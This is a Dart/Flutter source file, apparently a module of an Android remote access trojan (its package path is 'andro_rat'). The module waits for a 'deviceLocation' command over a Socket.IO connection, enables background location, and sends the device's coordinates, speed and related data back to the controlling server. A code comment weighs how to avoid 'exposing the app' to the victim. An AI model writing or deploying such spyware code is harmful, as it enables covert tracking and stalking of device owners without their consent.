import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:location/location.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;

class DeviceLocation {
  static const String remoteTrigger = "deviceLocation";
  final Location _location = Location();
  late SocketIO.Socket _socket;

  Future<Map> getPayload({ String? upon }) async {
    final payload = <String, dynamic> { "upon": upon ?? "request" };
    if (await _checkPoint()) {
      var data = await _location.getLocation();
      payload.addAll({ "metrics": _toMap(data) });
    } else {
      Debug.log("[Location Checkpoint]: Permission denied / Location service OFF");
      payload.addAll({ "error": "Location permission denied / service off" });
    }
    // Debug.log(payload);
    return payload;
  }

  Map<String, dynamic> _toMap(LocationData data) {
    return <String, dynamic> {
      "accuracy": data.accuracy,
      "altitude": data.altitude,
      "elapsedRealtimeNanos": data.elapsedRealtimeNanos,
      "elapsedRealtimeUncertaintyNanos": data.elapsedRealtimeUncertaintyNanos,
      "heading": data.heading,
      "headingAccuracy": data.headingAccuracy,
      "isMock": data.isMock,
      "latitude": data.latitude,
      "longitude": data.longitude,
      "provider": data.provider,
      "satelliteNumber": data.satelliteNumber,
      "speed": data.speed,
      "speedAccuracy": data.speedAccuracy,
      "time": data.time,
      "verticalAccuracy": data.verticalAccuracy,
    };
  }

  Future<bool> _checkPoint() async {
    // await _location.hasPermission();
    return (await Permission.location.isGranted || await Permission.location.request().isGranted) && await _location.serviceEnabled();
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      await sendPayload();
    });

    _initListeners();
  }

  void _initListeners() {
    _location.enableBackgroundMode(enable: true);

    // This, listening on location change, risks exposing the app
    // A location request should come from the server time to time, instead
    // Or, let the app send it on some short-long intervals

    // _location.onLocationChanged.listen((data) {
      // Debug.log("Location change detected");
      // Debug.log(data);
      // _sendPayload(remoteTrigger, { "upon": "update", "metrics": _toMap(data) });
    // });
  }

  void _sendPayload(String remoteTrigger, payload) {
    _socket.emit(remoteTrigger, payload);
  }

  Future<void> sendPayload({ String? upon }) async {
    Debug.log("[Sending Device Location]:");
    _sendPayload(remoteTrigger, await getPayload(upon: upon));
    Debug.log(":[End Sending Device Location]");
  }

}